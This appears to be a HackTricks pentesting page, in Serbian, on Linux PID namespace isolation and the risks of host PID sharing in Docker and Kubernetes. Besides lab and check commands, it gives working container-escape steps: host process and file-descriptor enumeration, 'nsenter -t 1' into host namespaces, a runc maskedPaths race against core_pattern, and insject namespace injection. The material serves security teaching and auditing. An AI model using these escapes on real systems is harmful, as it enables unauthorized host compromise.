# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

PID namespace kontroliše kako se procesi numerišu i koji su procesi vidljivi. Zbog toga kontejner može imati svoj PID 1 iako nije stvarna mašina. Unutar namespace-a, workload vidi ono što izgleda kao lokalno stablo procesa. Van namespace-a, host i dalje vidi stvarne host PIDs i punu strukturu procesa.

Sa aspekta bezbednosti, PID namespace je bitan zato što je vidljivost procesa vredna. Kada workload može videti host procese, može biti u stanju da uoči imena servisa, argumente komandne linije, tajne prosleđene u argumentima procesa, stanje izvedeno iz okruženja preko `/proc`, i potencijalne ciljeve za ulazak u namespace. Ako može da uradi više od pukog posmatranja tih procesa, na primer slanjem signala ili korišćenjem ptrace u odgovarajućim uslovima, problem postaje mnogo ozbiljniji.

## Operation

Novi PID namespace počinje sa sopstvenim internim numerisanjem procesa. Prvi proces kreiran u njemu postaje PID 1 iz ugla namespace-a, što znači da ima posebnu init-sličnu semantiku za napuštenu decu i ponašanje signala. To objašnjava mnoge čudnosti u kontejnerima vezane za init procese, reaping zombija i zašto se ponekad koriste mali init wrapper-i u kontejnerima.

Važna bezbednosna lekcija je da proces može delovati izolovano jer vidi samo svoje PID stablo, ali ta izolacija može biti namerno uklonjena. Docker to izlaže kroz `--pid=host`, dok Kubernetes to radi kroz `hostPID: true`. Kada se container pridruži host PID namespace-u, workload vidi host procese direktno, i mnogi kasniji putevi napada postaju mnogo realističniji.

## Lab

Da biste ručno kreirali PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell sada vidi privatni prikaz procesa. Zastavica `--mount-proc` je važna zato što montira procfs instancu koja odgovara novom PID namespace-u, čime lista procesa postaje koherentna iznutra.

Za poređenje ponašanja container-a:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Razlika je odmah vidljiva i laka za razumevanje, zbog čega je ovo dobar prvi lab za čitaoce.

## Korišćenje pri izvršavanju

Normalni kontejneri u Docker, Podman, containerd i CRI-O dobijaju sopstveni PID namespace. Kubernetes Pods obično takođe dobijaju izolovan prikaz PID-ova osim ako workload eksplicitno ne zahteva deljenje host PID-a. LXC/Incus okruženja se oslanjaju na isti kernel primitive, iako upotrebe system-container mogu izložiti komplikovanija stabla procesa i podstaći više prečica za debugovanje.

Isto pravilo važi svuda: ako runtime odluči da ne izoluje PID namespace, to je namerno smanjenje granice kontejnera.

## Pogrešne konfiguracije

Kanonska pogrešna konfiguracija je deljenje host PID-a. Timovi to često opravdavaju radi debugovanja, monitoringa ili pogodnosti za upravljanje servisima, ali to uvek treba tretirati kao značajnu sigurnosnu iznimku. Čak i ako kontejner nema neposrednu write primitive nad host procesima, sama vidljivost može otkriti mnogo o sistemu. Kada se dodaju capability poput `CAP_SYS_PTRACE` ili koristan pristup procfs, rizik se značajno uvećava.

Još jedna greška je pretpostavka da zato što workload po defaultu ne može da ubija ili ptrace-uje host procese, deljenje host PID-a stoga nije štetno. Takav zaključak zanemaruje vrednost enumeracije, dostupnost ciljeva za ulazak u namespace, i način na koji se vidljivost PID-ova kombinuje sa drugim oslabljenim kontrolama.

## Zloupotreba

Ako je host PID namespace podeljen, napadač može da ispituje host procese, prikupi argumente procesa, identifikuje interesantne servise, locira kandidatske PID-ove za `nsenter`, ili kombinuje vidljivost procesa sa ptrace-povezanim privilegijama kako bi ometao host ili susedne workload-ove. U nekim slučajevima, samo prepoznavanje pravog dugotrajno pokrenutog procesa je dovoljno da preoblikuje ostatak plana napada.

Prvi praktični korak je uvek potvrditi da su host procesi zaista vidljivi:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Kada su PID-ovi hosta vidljivi, argumenti procesa i ciljevi za ulazak u namespace često postaju najkorisniji izvor informacija:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ako je `nsenter` dostupan i postoje dovoljne privilegije, proverite da li se vidljivi host proces može koristiti kao most za namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Čak i kada je pristup onemogućen, deljenje host PID-ova je već vredno jer otkriva raspored servisa, runtime komponente i potencijalne privilegovane procese koje treba ciljati sledeće.

Vidljivost host PID-ova takođe čini zloupotrebu file-deskriptora realističnijom. Ako privilegovani host proces ili susedni workload ima otvoren osetljiv fajl ili socket, napadač bi mogao moći da pregleda `/proc/<pid>/fd/` i ponovo iskoristi taj deskriptor u zavisnosti od vlasništva, opcija montiranja procfs-a i modela ciljane usluge.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ove komande su korisne zato što odgovaraju na pitanje da li `hidepid=1` ili `hidepid=2` smanjuje vidljivost između procesa i da li su očigledno interesantni deskriptori, kao što su otvorene datoteke sa tajnama, logovi ili Unix soketi, uopšte vidljivi.

### Potpun primer: host PID + `nsenter`

Deljenje host PID postaje direktan host escape kada proces takođe ima dovoljno privilegija da se pridruži host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ako komanda uspe, proces u kontejneru sada se izvršava u host mount, UTS, network, IPC i PID namespace-ovima. Posledica je neposredna kompromitacija hosta.

Čak i kada `nsenter` sam nedostaje, isti rezultat se može postići putem host binarnog fajla ako je datotečni sistem hosta montiran:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Najnovije runtime napomene

Neki napadi relevantni za PID namespace nisu tradicionalne pogrešne konfiguracije `hostPID: true`, već bugovi u runtime implementaciji oko načina primene procfs zaštita tokom podizanja kontejnera.

#### `maskedPaths` utrka ka host procfs-u

U ranjivim verzijama `runc`, napadači koji mogu da kontrolišu image kontejnera ili `runc exec` workload mogli bi da trče fazu masking-a zamenom lokalnog `/dev/null` u kontejneru simboličkom vezom ka osetljivom procfs putu kao što je `/proc/sys/kernel/core_pattern`. Ako utrka uspe, masked-path bind mount može da se montira na pogrešan cilj i izloži host-globalne procfs kontrole novom kontejneru.

Korisna komanda za pregled:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Ovo je važno zato što konačni uticaj može biti isti kao kod direktnog procfs izlaganja: mogućnost zapisivanja u `core_pattern` ili `sysrq-trigger`, što može dovesti do izvršenja koda na hostu ili denial of service.

#### Namespace injection with `insject`

Alati za namespace injection, kao što je `insject`, pokazuju da interakcija sa PID-namespace-om ne mora uvek da podrazumeva prethodno ulazak u ciljnu namespace pre kreiranja procesa. Pomoćni proces se može kasnije prikačiti, pozvati `setns()`, i izvršavati dok zadržava vidljivost u ciljnom PID prostoru:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ovakva vrsta tehnike je važna pre svega za advanced debugging, offensive tooling i post-exploitation workflows gde namespace context mora biti pridružen nakon što je runtime već inicijalizovao workload.

### Povezani obrasci zloupotrebe FD

Dva obrasca vredi eksplicitno istaći kada su host PIDs vidljivi. Prvo, privilegovani proces može držati osetljiv file descriptor otvoren preko `execve()` zato što nije označen `O_CLOEXEC`. Drugo, servisi mogu prenositi file descriptors preko Unix sockets koristeći `SCM_RIGHTS`. U oba slučaja zanimljiv objekat više nije pathname, već već otvoreni handle koji proces sa nižim privilegijama može naslediti ili primiti.

Ovo je važno u radu sa containerima zato što handle može pokazivati na `docker.sock`, privileged log, host secret file, ili neki drugi objekat visoke vrednosti čak i kada sama putanja nije direktno dostupna iz container filesystem-a.

## Provere

Svrha ovih komandi je da se utvrdi da li proces ima privatni pogled na PID-ove ili da li već može da izlista znatno širi skup procesa.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Ako lista procesa sadrži očigledne servise sa hosta, host PID sharing je verovatno već aktiviran.
- Viđenje samo malog container-local stabla je normalna osnova; viđenje `systemd`, `dockerd`, ili nepovezanih demona nije.
- Kada su host PIDs vidljivi, čak i informacije o procesima koje su samo za čitanje postaju korisne za izviđanje.

Ako otkrijete container koji radi sa host PID sharing-om, nemojte to smatrati kozmetičkom razlikom. To je velika promena u tome šta workload može da posmatra i na šta može potencijalno da utiče.
{{#include ../../../../../banners/hacktricks-training.md}}
